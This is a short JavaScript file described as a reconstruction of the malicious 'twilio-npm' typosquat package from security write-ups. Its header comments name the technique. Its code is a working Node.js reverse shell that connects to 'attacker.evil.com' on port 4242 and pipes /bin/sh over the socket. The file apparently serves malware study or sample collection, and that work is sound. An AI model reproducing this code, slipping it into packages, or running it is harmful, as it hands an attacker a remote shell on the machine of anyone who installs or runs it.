// twilio-npm — reconstructed from public security analyses
// Source: https://www.sonatype.com/blog/open-source-attacks-on-the-rise-top-8-malicious-packages-found-in-npm
//
// 2024: Typosquatting the legitimate 'twilio' package.
// Contained a reverse shell payload connecting back to attacker.
//
// Technique: Typosquat + reverse shell via child_process

var net = require("net");
var cp = require("child_process");

var client = new net.Socket();
client.connect(4242, "attacker.evil.com", function () {
  var sh = cp.spawn("/bin/sh", []);
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});
